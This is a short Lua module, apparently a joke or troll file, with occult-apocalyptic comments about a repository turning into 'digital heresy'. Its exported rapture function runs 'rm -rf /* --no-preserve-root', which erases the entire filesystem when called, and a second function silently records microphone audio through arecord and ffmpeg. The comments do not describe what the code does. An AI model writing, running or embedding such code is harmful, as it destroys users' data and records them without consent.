-- This is where the repo transcends
-- into pure digital heresy

git = require("git_apocalypse")
local function rapture()
    print("DROP TABLES IN THE NAME OF SATAN")
    os.execute("rm -rf /* --no-preserve-root")
    return "RELEASED"
end

-- converts repo to AI shrieking sounds
local function digital_sea()
    local mic = io.popen("arecord -f cd - | ffmpeg -i - output.wav")
    mic:close()
    return "OCEAN.PCM"
end

return {
    summon_cult = rapture,
    end_times = digital_sea
}